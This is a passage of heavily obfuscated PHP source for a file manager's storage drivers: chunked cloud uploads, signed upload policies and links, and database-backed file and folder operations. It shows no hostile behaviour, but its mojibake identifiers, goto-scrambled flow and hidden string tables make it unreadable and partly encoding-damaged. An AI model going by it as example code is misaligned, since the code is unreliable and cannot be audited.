dæ”øº…‰: $aŒ¾°Î¯õ· = 1024 * 1024 * 10; $f­âÆÌİ£Ö = array($Fâ¡¦µ[1244], $Fâ¡¦µ[1245] . $fÄèÇŠñ, $Fâ¡¦µ[1246], $Fâ¡¦µ[1247] . $aŒ¾°Î¯õ·); $e÷æÂ„Ã¯¬ = $this->ussRequest($E„¥¤Š„¢º, $Fâ¡¦µ[210], !1, $f­âÆÌİ£Ö); goto eäÏèÜ•£í; D†Ø”æóæ‹: do { $b¤–¸æ¶³Æ = $A†ß»±™‚Ô[$Fâ¡¦µ[1249]]; fseek($ašŒ“ğÜªŠ, $B±ÜÌ…¾ğ–); $aÍ”°¼œÜ = fread($ašŒ“ğÜªŠ, $b¤–¸æ¶³Æ); $DºôŸğÚĞ² = 0; do { $DºôŸğÚĞ²++; $A†ß»±™‚Ô = $this->uploadPart($E„¥¤Š„¢º, $A†ß»±™‚Ô, $aÍ”°¼œÜ); } while (!$A†ß»±™‚Ô && $DºôŸğÚĞ² < 3); if (!$A†ß»±™‚Ô) { return !1; } $CàÊ¶¿‹å¥ = $A†ß»±™‚Ô[$Fâ¡¦µ[1248]]; $B±ÜÌ…¾ğ– += $b¤–¸æ¶³Æ; } while ($CàÊ¶¿‹å¥ != -1); fclose($ašŒ“ğÜªŠ); $f­âÆÌİ£Ö = array($Fâ¡¦µ[1250], $Fâ¡¦µ[1251] . $A†ß»±™‚Ô[$Fâ¡¦µ[1252]], $Fâ¡¦µ[1246]); goto e…ç› ×ñ; eäÏèÜ•£í: if (!$e÷æÂ„Ã¯¬[$Fâ¡¦µ[1023]]) { return !1; } $A†ß»±™‚Ô = $e÷æÂ„Ã¯¬[$Fâ¡¦µ[1025]]; $B±ÜÌ…¾ğ– = 0; goto b›İÓé‘“; A–âÍ÷ƒ¶Ó: $Fâ¡¦µ =& $_SERVER[õëù©û]; $fÄèÇŠñ = IO::size($dµëÅÁ¶¦); if ($fÄèÇŠñ <= 1024 * 1024 * 200) { $dÅĞõİÛ = array($Fâ¡¦µ[1243] . $dµëÅÁ¶¦); $e÷æÂ„Ã¯¬ = $this->ussRequest($E„¥¤Š„¢º, $Fâ¡¦µ[210], $dÅĞõİÛ); return $e÷æÂ„Ã¯¬[$Fâ¡¦µ[1023]] ? $this->getPathOuter($E„¥¤Š„¢º) : !1; } goto dæ”øº…‰; d»éªŠš˜¿: } private function uploadPart($d³…àÏ½¦¡, $A´•—Ö‘î, &$Aßå°³²‘ß) { $Fˆî•ÜøÂ÷ =& $_SERVER[õëù©û]; $cÌâ‚Œê÷ = array($Fˆî•ÜøÂ÷[1253], $Fˆî•ÜøÂ÷[1251] . $A´•—Ö‘î[$Fˆî•ÜøÂ÷[1252]], $Fˆî•ÜøÂ÷[1254] . $A´•—Ö‘î[$Fˆî•ÜøÂ÷[1248]], $Fˆî•ÜøÂ÷[1255] . $A´•—Ö‘î[$Fˆî•ÜøÂ÷[1249]]); $f£çÜšˆÚé = $this->ussRequest($d³…àÏ½¦¡, $Fˆî•ÜøÂ÷[210], $Aßå°³²‘ß, $cÌâ‚Œê÷); return !$f£çÜšˆÚé[$Fˆî•ÜøÂ÷[1023]] ? $f£çÜšˆÚé[$Fˆî•ÜøÂ÷[1023]] : $f£çÜšˆÚé[$Fˆî•ÜøÂ÷[1025]]; } public function uploadFormData($Fø‰ñºÉÀá, $bµá‹ÕÎ™ = 3600) { return $this->uploadPolicy($Fø‰ñºÉÀá, $bµá‹ÕÎ™); } public function multiUploadFormData($f¼ºâ›Ó²È, $F¼¶ƒñæÇ = 3600) { $d‘»Î‰”©§ =& $_SERVER[õëù©û]; $F»¤–êÚæ = (int) $GLOBALS[$d‘»Î‰”©§[7]][$d‘»Î‰”©§[77]]; return $this->uploadPolicy($f¼ºâ›Ó²È, $F¼¶ƒñæÇ, $F»¤–êÚæ); } private function uploadPolicy($bË¦ì¾Ş˜, $Bš‚ï¸›ÙÕ = 3600, $CÉÇ¡ŒĞçã = 0) { goto F¸ô‰•Öí; F¸ô‰•Öí: $Aå™¹™’â =& $_SERVER[õëù©û]; $BàÇŒŒƒ˜® = $Aå™¹™’â[8] . $this->bucket; $E÷çÊŞ¡Õ· = gmdate($Aå™¹™’â[1188]); goto aš÷‹¬ïõÀ; eÔ¤ˆ×Å±: $b¢ÊŞœàµ = base64_encode(hash_hmac($Aå™¹™’â[1225], "\x50\117\x53\x54\46{$BàÇŒŒƒ˜®}\x26{$E÷çÊŞ¡Õ·}\46{$CÓãºÕÛÌ}", md5("{$this->userpass}"), !0)); $b¯Œ¬›º = array($Aå™¹™’â[1096] => $CÓãºÕÛÌ, $Aå™¹™’â[1260] => "\125\120\x59\125\116\40{$this->username}\x3a{$b¢ÊŞœàµ}", $Aå™¹™’â[165] => $this->endpoint . $BàÇŒŒƒ˜®); return $b¯Œ¬›º; goto D‰ˆ¥¬Íôá; aš÷‹¬ïõÀ: $d…‡ÜË…÷£ = array($Aå™¹™’â[1256] => $this->bucket, $Aå™¹™’â[1257] => $bË¦ì¾Ş˜, $Aå™¹™’â[1258] => time() + $Bš‚ï¸›ÙÕ, $Aå™¹™’â[1259] => $E÷çÊŞ¡Õ·); if ($CÉÇ¡ŒĞçã) { $d…‡ÜË…÷£[$Aå™¹™’â[1174]] = $CÉÇ¡ŒĞçã; } $CÓãºÕÛÌ = base64_encode(json_encode($d…‡ÜË…÷£)); goto eÔ¤ˆ×Å±; D‰ˆ¥¬Íôá: } public function download($e£¨“§ÆÙì, $c‘Ùº¿‘„É) { goto c•ÓˆÂ–¬; c•ÓˆÂ–¬: $A¸‹øŒÃËĞ = IO::getPathInner(IO::mkfile($c‘Ùº¿‘„É)); if (!($C•¡Ÿ²–ï© = $this->link($e£¨“§ÆÙì))) { return !1; } $D­¯ËÍŒ¿” = 0; goto FõêÕÓÙŠ”; dùõ½æäîƒ: fclose($F¸ÀöÖ¸ŸÜ); return $c‘Ùº¿‘„É; goto c©¾‚œ‰Ô»; FõêÕÓÙŠ”: $EÄñõôö® = 1024 * 200; $F¸ÀöÖ¸ŸÜ = fopen($A¸‹øŒÃËĞ, $_SERVER[õëù©û][1209]); while (!0) { $f¤²ŞœßŒÆ = $this->fileSubstr($e£¨“§ÆÙì, $D­¯ËÍŒ¿”, $EÄñõôö®); if ($f¤²ŞœßŒÆ === !1) { return !1; } fwrite($F¸ÀöÖ¸ŸÜ, $f¤²ŞœßŒÆ); $D­¯ËÍŒ¿” += $EÄñõôö®; if (strlen($f¤²ŞœßŒÆ) < $EÄñõôö®) { break; } } goto dùõ½æäîƒ; c©¾‚œ‰Ô»: } public function link($EÙ¯¶ƒÜ», $F©¢È©ˆî„ = array()) { $b‰Ÿ”àÔ =& $_SERVER[õëù©û]; $EÙ¯¶ƒÜ» = trim($EÙ¯¶ƒÜ», $b‰Ÿ”àÔ[8]); if (!empty($this->token)) { $C…œ¢ò÷Áğ = strtotime(date($b‰Ÿ”àÔ[1261])); $eµØ–İ·¤Õ = substr(md5($this->token . $b‰Ÿ”àÔ[268] . $C…œ¢ò÷Áğ . $b‰Ÿ”àÔ[1262] . $EÙ¯¶ƒÜ»), 12, 8) . $C…œ¢ò÷Áğ; $F©¢È©ˆî„[] = $b‰Ÿ”àÔ[1263] . $eµØ–İ·¤Õ; } $a¶ÌîŞäª‰ = !empty($F©¢È©ˆî„) ? $b‰Ÿ”àÔ[69] . implode($b‰Ÿ”àÔ[268], $F©¢È©ˆî„) : $b‰Ÿ”àÔ[33]; return $this->getHost() . $b‰Ÿ”àÔ[8] . $EÙ¯¶ƒÜ» . $a¶ÌîŞäª‰; } public function fileOut($eÜ±­Á›¯, $EÜ›ŸÔÀî = false, $AÒà½›¿¬ø = false, $aâÜ³‚Ö = '') { if (!$AÒà½›¿¬ø) { $AÒà½›¿¬ø = $this->pathThis($eÜ±­Á›¯); } $B‰ÆÁÄœÒ£ = $EÜ›ŸÔÀî ? array($_SERVER[õëù©û][1264] . rawurlencode($AÒà½›¿¬ø)) : array(); $eâƒç‹Š¿ = $this->link($eÜ±­Á›¯, $B‰ÆÁÄœÒ£); $this->fileOutLink($eâƒç‹Š¿); } public function fileOutServer($bİİá‹×ù…, $A‘ŠÍÚ„¬½ = false, $dë¶¸Ò‰  = false, $a¦ÛÙØ¼Ì¨ = '') { parent::fileOut($bİİá‹×ù…, $A‘ŠÍÚ„¬½, $dë¶¸Ò‰ , $a¦ÛÙØ¼Ì¨); } public function fileOutImage($F´™èô¨Ñ, $aØ£òÓ©› = 250) { $bÛ×Øí»äõ = $this->link($F´™èô¨Ñ . $_SERVER[õëù©û][1265] . $aØ£òÓ©›); $this->fileOutLink($bÛ×Øí»äõ); } public function fileOutImageServer($A­í˜Ä÷¡, $Cãó•ŞŒ¯ò = 250) { parent::fileOutImage($A­í˜Ä÷¡, $Cãó•ŞŒ¯ò); } public function hashMd5($aœŠ‰Ñô ¼) { $EŠ‡ò½éé =& $_SERVER[õëù©û]; $eÛ‡ÅÁÓè‰ = $this->objectMeta($aœŠ‰Ñô ¼); return isset($eÛ‡ÅÁÓè‰[$EŠ‡ò½éé[192]]) ? $eÛ‡ÅÁÓè‰[$EŠ‡ò½éé[192]] : !1; } public function size($A“Ø‘œˆ) { $cÜÇ·ëó¡ø = $this->objectMeta($A“Ø‘œˆ); return $cÜÇ·ëó¡ø ? $cÜÇ·ëó¡ø[$_SERVER[õëù©û][77]] : 0; } public function info($Dç‰ØÎ³Ç) { if ($this->isFolder($Dç‰ØÎ³Ç)) { return $this->folderInfo($Dç‰ØÎ³Ç); } else { if ($this->isFile($Dç‰ØÎ³Ç)) { return $this->fileInfo($Dç‰ØÎ³Ç); } } return !1; } public function exist($A¬½¿µ©åº) { return $this->isFile($A¬½¿µ©åº) || $this->isFolder($A¬½¿µ©åº); } public function isFile($få»š±Ê±) { return !$this->isFolder($få»š±Ê±) && $this->objectMeta($få»š±Ê±); } public function isFolder($cÄÏÍ´Ã“Ù) { return $this->cacheMethod($_SERVER[õëù©û][219], $cÄÏÍ´Ã“Ù); } protected function objectMeta($DÔ‚¡ŸÁ¯) { return $this->cacheMethod($_SERVER[õëù©û][220], $DÔ‚¡ŸÁ¯); } protected function _objectMeta($bóŠÙ®¿¨) { goto bèßÇ®¼ˆª; bèßÇ®¼ˆª: $Cê«â‰ £å =& $_SERVER[õëù©û]; if ($bóŠÙ®¿¨ == $Cê«â‰ £å[33] || $bóŠÙ®¿¨ == $Cê«â‰ £å[8]) { return array(); } $fÔ¶ñÉô×å = $this->ussRequest($bóŠÙ®¿¨, $Cê«â‰ £å[1266]); goto DùÁ“õ’•§; DùÁ“õ’•§: if (!$fÔ¶ñÉô×å[$Cê«â‰ £å[1023]]) { return null; } $A±ñÙ“®˜¥ = isset($fÔ¶ñÉô×å[$Cê«â‰ £å[1025]]) ? $fÔ¶ñÉô×å[$Cê«â‰ £å[1025]] : array(); if (!isset($A±ñÙ“®˜¥[$Cê«â‰ £å[1267]])) { return null; } goto b‰ÇİÅ‡ˆ”; b‰ÇİÅ‡ˆ”: $EåìÀÂªÑè = array($Cê«â‰ £å[28] => get_path_this($bóŠÙ®¿¨), $Cê«â‰ £å[29] => isset($A±ñÙ“®˜¥[$Cê«â‰ £å[1267]]) ? $A±ñÙ“®˜¥[$Cê«â‰ £å[1267]] : null, $Cê«â‰ £å[77] => isset($A±ñÙ“®˜¥[$Cê«â‰ £å[1268]]) ? $A±ñÙ“®˜¥[$Cê«â‰ £å[1268]] : null, $Cê«â‰ £å[192] => isset($A±ñÙ“®˜¥[$Cê«â‰ £å[1269]]) ? $A±ñÙ“®˜¥[$Cê«â‰ £å[1269]] : null, $Cê«â‰ £å[1236] => isset($A±ñÙ“®˜¥[$Cê«â‰ £å[1270]]) ? $A±ñÙ“®˜¥[$Cê«â‰ £å[1270]] : null); $EåìÀÂªÑè[$Cê«â‰ £å[1237]] = isset($A±ñÙ“®˜¥[$Cê«â‰ £å[1271]]) ? strtotime($A±ñÙ“®˜¥[$Cê«â‰ £å[1271]]) : $EåìÀÂªÑè[$Cê«â‰ £å[1236]]; return $EåìÀÂªÑè; goto EÉ—Ëå„; EÉ—Ëå„: } protected function _isFolder($f¡å´êØ…˜) { $e÷¢ÀÖ‘ºß =& $_SERVER[õëù©û]; if ($f¡å´êØ…˜ == $e÷¢ÀÖ‘ºß[33] || $f¡å´êØ…˜ == $e÷¢ÀÖ‘ºß[8]) { return !0; } $EğÚòĞß™Ø = $this->objectMeta($f¡å´êØ…˜); return isset($EğÚòĞß™Ø[$e÷¢ÀÖ‘ºß[29]]) && $EğÚòĞß™Ø[$e÷¢ÀÖ‘ºß[29]] == $e÷¢ÀÖ‘ºß[76] ? !0 : !1; } } goto CˆæóØæ„; bŒ†·Ï‘‡½: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($CÛƒèÜóĞ¸) { $this->pathParse = $CÛƒèÜóĞ¸; $this->model = Model($_SERVER[õëù©û][1101]); } public function getPath($A—°ê¾Š…‡) { return trim($A—°ê¾Š…‡, $_SERVER[õëù©û][8]); } public function pathFather($DÀÚôˆªïø) { $eğ–„«ïœ× = $this->parse($DÀÚôˆªïø); $eğ–„«ïœ× = $this->infoSimple($DÀÚôˆªïø); return $eğ–„«ïœ× ? $eğ–„«ïœ×[$_SERVER[õëù©û][456]] : !1; } public function getPathName($d¹¥“ˆÛî) { $Bõá‘ˆÒà = $this->infoSimple($d¹¥“ˆÛî); return $Bõá‘ˆÒà ? $Bõá‘ˆÒà[$_SERVER[õëù©û][28]] : !1; } public function getPathOuter($bàó¤¤®£) { if (!$bàó¤¤®£) { return $bàó¤¤®£; } $F˜À¾‚ìî = $this->parse($bàó¤¤®£); return KodIO::make($F˜À¾‚ìî[$_SERVER[õëù©û][363]]); } public function copyFolderFromIO($Aà¾£“êÀÜ, $C¡½œõè•, $BØ‡¬ÇòƒÎ, $A·ñ¥µ™, $f†®Ğ‚³š) { $e¥¯ºó¶¡… = $this->model->copyFolderFromIO($Aà¾£“êÀÜ, $C¡½œõè•, $BØ‡¬ÇòƒÎ, $A·ñ¥µ™, $f†®Ğ‚³š); return KodIO::make($e¥¯ºó¶¡…); } public function isParentOf($AÑ¢£İ–ïİ, $eÀ‘·ÈÉ) { return $this->model->isParentOf($AÑ¢£İ–ïİ, $eÀ‘·ÈÉ); } public function mkfile($C”Ïî§–ä¬, $böä¦‘ÈÚ = '', $c¥•˜ù‰ïÁ = REPEAT_RENAME) { $dÃˆç¨Ïñô =& $_SERVER[õëù©û]; $f¨è·¬æäÑ = $this->parse($C”Ïî§–ä¬); $C”Ïî§–ä¬ = $f¨è·¬æäÑ[$dÃˆç¨Ïñô[363]]; for ($bÈİ¯Æ„ƒé = 0; $bÈİ¯Æ„ƒé < count($f¨è·¬æäÑ[$dÃˆç¨Ïñô[1102]]); $bÈİ¯Æ„ƒé++) { $C³‚©ƒš²› = $f¨è·¬æäÑ[$dÃˆç¨Ïñô[1102]][$bÈİ¯Æ„ƒé]; if ($bÈİ¯Æ„ƒé == count($f¨è·¬æäÑ[$dÃˆç¨Ïñô[1102]]) - 1) { $C”Ïî§–ä¬ = $this->model->mkfile($C”Ïî§–ä¬, $C³‚©ƒš²›, $böä¦‘ÈÚ, $c¥•˜ù‰ïÁ); break; } $C”Ïî§–ä¬ = $this->model->mkdir($C”Ïî§–ä¬, $C³‚©ƒš²›, REPEAT_SKIP); } return $this->getPathOuter($C”Ïî§–ä¬); } public function mkdir($e×±×¶’ˆÕ, $eÍÏèÅìœ = REPEAT_SKIP) { $Cù—˜­ÙÛ =& $_SERVER[õëù©û]; $a¿¯Ş£Œùæ = $this->parse($e×±×¶’ˆÕ); $e×±×¶’ˆÕ = $a¿¯Ş£Œùæ[$Cù—˜­ÙÛ[363]]; for ($CãŒ¾êã†´ = 0; $CãŒ¾êã†´ < count($a¿¯Ş£Œùæ[$Cù—˜­ÙÛ[1102]]); $CãŒ¾êã†´++) { $BîŞØä¢ = $a¿¯Ş£Œùæ[$Cù—˜­ÙÛ[1102]][$CãŒ¾êã†´]; $e×±×¶’ˆÕ = $this->model->mkdir($e×±×¶’ˆÕ, $BîŞØä¢, $eÍÏèÅìœ); } return $this->getPathOuter($e×±×¶’ˆÕ); } public function copyFile($aÃ„òº¥, $dÒ¦ÁŒÏ¶†, $a‹ĞæÖ”¾» = REPEAT_REPLACE) { $DËõ³óãÇ =& $_SERVER[õëù©û]; $dƒÂã¹Ï¡± = $this->parse($dÒ¦ÁŒÏ¶†); $B‹‡ÀËÒ… = $this->model->copy($aÃ„òº¥, $dƒÂã¹Ï¡±[$DËõ³óãÇ[363]], $a‹ĞæÖ”¾», $dƒÂã¹Ï¡±[$DËõ³óãÇ[75]]); return $B‹‡ÀËÒ… ? $this->getPathOuter($B‹‡ÀËÒ…) : !1; } public function moveFile($a¾ğ”»Á, $fÒÙ›»Î°, $e‘£¯ù”„ = REPEAT_REPLACE) { $Fø†âçÃ‡î =& $_SERVER[õëù©û]; $Eéöƒø˜©ˆ = $this->parse($fÒÙ›»Î°); $BÎŠàø¿ = $this->model->move($a¾ğ”»Á, $Eéöƒø˜©ˆ[$Fø†âçÃ‡î[363]], $e‘£¯ù”„, $Eéöƒø˜©ˆ[$Fø†âçÃ‡î[75]]); return $BÎŠàø¿ ? $this->getPathOuter($BÎŠàø¿) : !1; } public function copy($cØĞ´¯½‚‹, $eŒ»óŸ±ô„, $DÜóó¸× = REPEAT_REPLACE) { $cî®ˆà©ìœ = $this->parse($eŒ»óŸ±ô„); $EòÁŠ˜†ÅÇ = $this->model->copy($cØĞ´¯½‚‹, $cî®ˆà©ìœ[$_SERVER[õëù©û][363]], $DÜóó¸×); return $EòÁŠ˜†ÅÇ ? $this->getPathOuter($EòÁŠ˜†ÅÇ) : !1; } public function move($e‚İ°˜ğ¬ï, $AÑµçÄ§Š , $aÏ›ĞØ¾Ãé = REPEAT_REPLACE) { $f‡¥‚ éªê = $this->parse($AÑµçÄ§Š ); $Dè™°Åå­¡ = $this->model->move($e‚İ°˜ğ¬ï, $f‡¥‚ éªê[$_SERVER[õëù©û][363]], $aÏ›ĞØ¾Ãé); return $Dè™°Åå­¡ ? $this->getPathOuter($Dè™°Åå­¡) : !1; } public function remove($B°¿œğƒ , $A©áÎåÕº» = true) { return $this->model->remove($B°¿œğƒ , $A©áÎåÕº»); } public function rename($A®¦µ•ËìÎ, $B¼‰‘†ŠÊå) { $fÏÊ§ïÓÒÒ = $this->model->rename($A®¦µ•ËìÎ, $B¼‰‘†ŠÊå); return $fÏÊ§ïÓÒÒ ? $this->getPathOuter($A®¦µ•ËìÎ) : $fÏÊ§ïÓÒÒ; } public function size($BÜÎø•±â›) { $f·ôÖÚ‰Ğñ = $this->infoSimple($BÜÎø•±â›); return $f·ôÖÚ‰Ğñ ? $f·ôÖÚ‰Ğñ[$_SERVER[õëù©û][77]] : 0; } public function infoSimple($CŒÌœÇ¼Ó») { return $this->model->sourceInfo($CŒÌœÇ¼Ó»); } public function info($aãäå‘õô—) { return $this->infoParse($aãäå‘õô—); } public function infoAuth($DÛö’’¾Á©) { return $this->infoParse($DÛö’’¾Á©, !1, !0); } public function infoWithChildren($A¶‚Èô”¾Ï) { return $this->infoParse($A¶‚Èô”¾Ï, !0); } protected function infoParse($d¹Ñ½¦¡‹ù, $EàƒŞìˆ¦Ü = false, $F¼’¬¼¤®‰ = false) { if (!$EàƒŞìˆ¦Ü) { return $this->model->pathInfo($d¹Ñ½¦¡‹ù, $F¼’¬¼¤®‰); } return $this->model->pathInfoMore($d¹Ñ½¦¡‹ù); } public function infoFull($CÏîÚÑ£ÍÜ) { $D„ÌÜ¦ÑÈ =& $_SERVER[õëù©û]; $aí¸ìÙŸ’è = explode($D„ÌÜ¦ÑÈ[8], $CÏîÚÑ£ÍÜ); $CÍ›ãİŒò = implode($D„ÌÜ¦ÑÈ[8], array_splice($aí¸ìÙŸ’è, 1)); return $this->model->pathInfoByPath($aí¸ìÙŸ’è[0], $CÍ›ãİŒò); } public function hashSimple($cš—çÎ¼Üà) { $bèñ‡ÈíßÓ =& $_SERVER[õëù©û]; $BŠÛÒš ³à = $this->infoWithChildren($cš—çÎ¼Üà); return $BŠÛÒš ³à[$bèñ‡ÈíßÓ[158]][$bèñ‡ÈíßÓ[160]]; } public function hashMd5($cá‚â¬ˆì°) { $CñÓí™İ¦ó =& $_SERVER[õëù©û]; $DÊä×·­ ® = $this->infoWithChildren($cá‚â¬ˆì°); return $DÊä×·­ ®[$CñÓí™İ¦ó[158]][$CñÓí™İ¦ó[159]]; } public function exist($då£Ø÷®ê§) { $bŠ†–˜ÊÜ» =& $_SERVER[õëù©û]; $B§Œ†ó°¼¹ = $this->parse($då£Ø÷®ê§); if (!$B§Œ†ó°¼¹[$bŠ†–˜ÊÜ»[75]]) { return $this->isFile($då£Ø÷®ê§) || $this->isFolder($då£Ø÷®ê§); } $EíÑÁ‘Ô‰ = array($bŠ†–˜ÊÜ»[364] => $B§Œ†ó°¼¹[$bŠ†–˜ÊÜ»[363]], $bŠ†–˜ÊÜ»[28] => $B§Œ†ó°¼¹[$bŠ†–˜ÊÜ»[75]]); $A’ÚŒ†µƒæ = $this->model->where($EíÑÁ‘Ô‰)->find(); return $A’ÚŒ†µƒæ ? !0 : !1; } public function isFile($a•éæÚ˜º) { $FÍÔŒÊéŠÂ =& $_SERVER[õëù©û]; $EÎôĞëèñ• = $this->infoSimple($a•éæÚ˜º); return $EÎôĞëèñ• && $EÎôĞëèñ•[$FÍÔŒÊéŠÂ[366]] == $FÍÔŒÊéŠÂ[83] ? !1 : !0; } public function isFolder($dŸ¦âÀ„) { $c¨¹ïÓöª¶ =& $_SERVER[õëù©û]; $a²ì±ö ØÇ = $this->infoSimple($dŸ¦âÀ„); return $a²ì±ö ØÇ && $a²ì±ö ØÇ[$c¨¹ïÓöª¶[366]] == $c¨¹ïÓöª¶[83] ? !0 : !1; } public function listPath($fŠ¬“¯ï×Ì, $DÌ¿Ğ­ôº» = false) { $D¡‡³‚¢Àğ =& $_SERVER[õëù©û]; if ($fŠ¬“¯ï×Ì == $D¡‡³‚¢Àğ[33]) { return !1; } $d¤˜ÂÀœ¦ = array($D¡‡³‚¢Àğ[364] => $fŠ¬“¯ï×Ì); if ($DÌ¿Ğ­ôº») { return $this->model->listSource($d¤˜ÂÀœ¦, -1); } return $this->model->listSource($d¤˜ÂÀœ¦); } public function has($F¡­õ«ÀºÔ, $dïã·æà×¯ = false, $d¿ÆˆÈ ® = null) { $c¶ßÍÎÑùÜ =& $_SERVER[õëù©û]; $fäôĞÌìø = $this->infoWithChildren($F¡­õ«ÀºÔ); if ($dïã·æà×¯) { return array($c¶ßÍÎÑùÜ[188] => $fäôĞÌìø[$c¶ßÍÎÑùÜ[188]], $c¶ßÍÎÑùÜ[187] => $fäôĞÌìø[$c¶ßÍÎÑùÜ[187]]); } return $d¿ÆˆÈ ® ? $fäôĞÌìø[$c¶ßÍÎÑùÜ[188]] : $fäôĞÌìø[$c¶ßÍÎÑùÜ[187]]; } public function listAll($eï£•ïœá„) { $D†»¸¥Ê¾† = IO::info($this->pathParse[$_SERVER[õëù©û][75]]); if (!$D†»¸¥Ê¾†) { return array(); } return $this->model->listAll($eï£•ïœá„); } public function getContent($AÔæÅğ­ŒŠ) { return $this->model->getContent($AÔæÅğ­ŒŠ); } public function setContent($eƒÊ®ˆÛì­, $CÃï¾…ãøò = '') { return $this->model->setContent($eƒÊ®ˆÛì­, $CÃï¾…ãøò); } public function fileSubstr($aãÏÂêòë, $BŒ¤§Â×È®, $e‚¤ˆ¿©˜) { return $this->model->fileSubstr($aãÏÂêòë, $BŒ¤§Â×È®, $e‚¤ˆ¿©˜); } public function download($E—ŠÎ¨¹´, $Fš´ğÛ¦ÑÖ = '') { $B›ÍÛîä‹ = get_path_father($Fš´ğÛ¦ÑÖ); $cÜ©¥¦›„ = get_path_this($Fš´ğÛ¦ÑÖ); $a¬®÷íè¥ = $this->model->fileInfoGet($E—ŠÎ¨¹´); $bŞõé¬Ğ¶® = IO::copy($a¬®÷íè¥[$_SERVER[õëù©û][75]], $B›ÍÛîä‹, !1, $cÜ©¥¦›„); return $bŞõé¬Ğ¶®; } public function upload($D‚›Š–¼Õó, $EóÊÓ˜¼–¡, $Bß…ìŠÆ = false, $c¦Ş¢šŠİº = REPEAT_REPLACE) { $eÛïìÏóÊÌ =& $_SERVER[õëù©û]; $Añ¢åºîŠƒ = $this->parse($D‚›Š–¼Õó); $CšŠøù“¢† = $this->model->addFile($Añ¢åºîŠƒ[$eÛïìÏóÊÌ[363]], $EóÊÓ˜¼–¡, $Añ¢åºîŠƒ[$eÛïìÏóÊÌ[75]], $Bß…ìŠÆ, $c¦Ş¢šŠİº); return $this->getPathOuter($CšŠøù“¢†); } public function uploadFileByID($B»‡©ÃÈ‹î, $EÚŒ¢Ü‹²“, $aºÀŒÜºïê) { $CÉºßñˆ­’ =& $_SERVER[õëù©û]; $eŒÔÁ¾³Š³ = $this->parse($B»‡©ÃÈ‹î); $DÉÉ‘ˆÈ” = $this->model->addFileByFileID($eŒÔÁ¾³Š³[$CÉºßñˆ­’[363]], $EÚŒ¢Ü‹²“, $eŒÔÁ¾³Š³[$CÉºßñˆ­’[75]], $aºÀŒÜºïê); return $this->getPathOuter($DÉÉ‘ˆÈ”); } public function addFileByRemote($A™‚‹µëÍ, $A’–½‚ØĞ, $a‚‘‚´ = array(), $bŒ¾íî× = '', $FÒÛÚİÕ³‹) { $b®ç‹ö†‹ =& $_SERVER[õëù©û]; $A÷¡õŠ³Ü· = $this->parse($A™‚‹µëÍ); $bŒ¾íî× = empty($bŒ¾íî×) ? $A÷¡õŠ³Ü·[$b®ç‹ö†‹[75]] : $bŒ¾íî×; $a˜°Ì¼ç°¥ = $this->model->addFileByRemote($A÷¡õŠ³Ü·[$b®ç‹ö†‹[363]], $A’–½‚ØĞ, $bŒ¾íî×, $a‚‘‚´, $FÒÛÚİÕ³‹); return $this->getPathOuter($a˜°Ì¼ç°¥); } public function uploadLink($bÊ…É×‘î™, $däò½«¯ÁŒ = 0) { $dÁº¤”õ =& $_SERVER[õëù©û]; $C²ÂÄíã©Á = $this->parse($bÊ…É×‘î™); $bÊ…É×‘î™ = Model($dÁº¤”õ[539])->createFileName($C²ÂÄíã©Á[$dÁº¤”õ[75]]); $fÈåœí£´ß = IO::uploadLink($bÊ…É×‘î™, $däò½«¯ÁŒ); return $fÈåœí£´ß; } public function fileNameAuto($FãŞÁ¢¨Ç©, $Aƒ‰Ù¼©Ê¯, $AñªíÚ¡Ä = REPEAT_REPLACE, $eÂ×Ã‹‡Ò = false) { return $this->model->fileNameAuto($FãŞÁ¢¨Ç©, $Aƒ‰Ù¼©Ê¯, $AñªíÚ¡Ä, $eÂ×Ã‹‡Ò); } public function fileNameExist($cŒöËİ”‡, $cš©Ü•ˆİ) { return $this->model->fileNameExist($cŒöËİ”‡, $cš©Ü•ˆİ); } protected function _fileOut($f²‡òÂ—­ª, $AÏ¨¢é·¥± = false, $D¸èàÊöÜÑ = false, $Bæ”·Šöƒ² = '', $dÛŠ¼¢‘Â™ = false) { goto eÍ«¡ÕÇ¡; E‘„¬‰ê¡–: if ($dÛŠ¼¢‘Â™) { return IO::fileOutServer($b²…ñ‡¥¬Ò[$AËòÍ™²Üˆ[75]], $AÏ¨¢é·¥±, $DÊáÙÄ­İ, $Bæ”·Šöƒ²); } IO::fileOut($b²…ñ‡¥¬Ò[$AËòÍ™²Üˆ[75]], $AÏ¨¢é·¥±, $DÊáÙÄ­İ, $Bæ”·Šöƒ²); goto F¿†ÌÀÎÌå; eÍ«¡ÕÇ¡: $AËòÍ™²Üˆ =& $_SERVER[õëù©û]; $cÖé¼¹ÓØé = $this->model->sourceInfo($f²‡òÂ—­ª); if ($cÖé¼¹ÓØé[$AËòÍ™²Üˆ[366]] == $AËòÍ™²Üˆ[83]) { header($AËòÍ™²Üˆ[1103]); die; } goto dŸ”¾î­è‚; dŸ”¾î­è‚: $b²…ñ‡¥¬Ò = $this->model->fileInfoGet($f²‡òÂ—­ª); $Bæ”·Šöƒ² = $b²…ñ‡¥¬Ò[$AËòÍ™²Üˆ[159]] ? $b²…ñ‡¥¬Ò[$AËòÍ™²Üˆ[159]] : $Bæ”·Šöƒ²; $DÊáÙÄ­İ = isset($GLOBALS[$AËòÍ™²Üˆ[1104]]) ? $GLOBALS[$AËòÍ™²Üˆ[1104]] : $cÖé¼¹ÓØé[$AËòÍ™²Üˆ[28]]; goto E‘„¬‰ê¡–; F¿†ÌÀÎÌå: } public function fileOut($FˆÇÜæø‡, $CÕ÷×ƒÃ‡‹ = false, $aß¡ŠŸ¬Ñ = false, $A¿ô·İˆ­‡ = '') { $this->_fileOut($FˆÇÜæø‡, $CÕ÷×ƒÃ‡‹, $aß¡ŠŸ¬Ñ, $A¿ô·İˆ­‡); } public function fileOutServer($aÈË®ÂÙ¿, $e´Š®ë÷Í = false, $aÑÑ¸Äö³ = false, $a†Ÿ‘ÀÒâš = '') { $this->_fileOut($aÈË®ÂÙ¿, $e´Š®ë÷Í, $aÑÑ¸Äö³, $a†Ÿ‘ÀÒâš, !0); } protected function _fileOutImage($C®¿ÓŒªœ, $Bˆ„Ì÷ªøÓ = 250) { $Fª‰«œ¼±Ø =& $_SERVER[õëù©û]; $eÄ‡¢´‚× = $this->model->sourceInfo($C®¿ÓŒªœ); if ($eÄ‡¢´‚×[$Fª‰«œ¼±Ø[366]] == $Fª‰«œ¼±Ø[83]) { show_json($Fª‰«œ¼±Ø[1105] . $C®¿ÓŒªœ, !1); } $GLOBALS[$Fª‰«œ¼±Ø[1104]] = $eÄ‡¢´‚×[$Fª‰«œ¼±Ø[28]]; $B‘Ì½² = 